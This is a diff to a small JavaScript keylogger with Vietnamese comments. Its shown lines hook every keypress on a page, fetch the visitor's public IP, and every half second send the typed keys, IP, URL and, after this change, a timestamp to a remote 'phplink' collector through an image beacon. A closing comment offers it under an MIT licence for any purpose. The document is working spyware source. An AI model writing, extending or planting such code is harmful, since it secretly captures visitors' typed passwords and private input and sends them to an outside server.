@@ -9,9 +9,10 @@ document.onkeypress = function(e) {
   if (prevent == 0) keys+=key;
   prevent = 0;
 }
+var ngaygio = new Date().toLocaleString();
 $(document).ready(function(){
         $.ajax({url: "https://api.ipify.org/?format=txt", success: function(result){
-            new Image().src = phplink+'?k='+'<br>Phiên mới, IP: '+result+', URL: '+window.location.href+'<br>';
+            new Image().src = phplink+'?k='+'<br>Phiên mới, IP: '+result+', URL: '+window.location.href+', Thời gian: '+ngaygio+'<br>';
         }});
 });
 window.setInterval(function(){
@@ -20,3 +21,4 @@ if(keys != '') {
   keys = '';
 }
 }, 500);
+// Bản quyền thuộc Đặng Quốc Trung, giấy phép MIT (bạn có thể edit và sử dụng thoải mái vì bất cứ mục đính nào miễn là vẫn tôn trọng bản quyền)
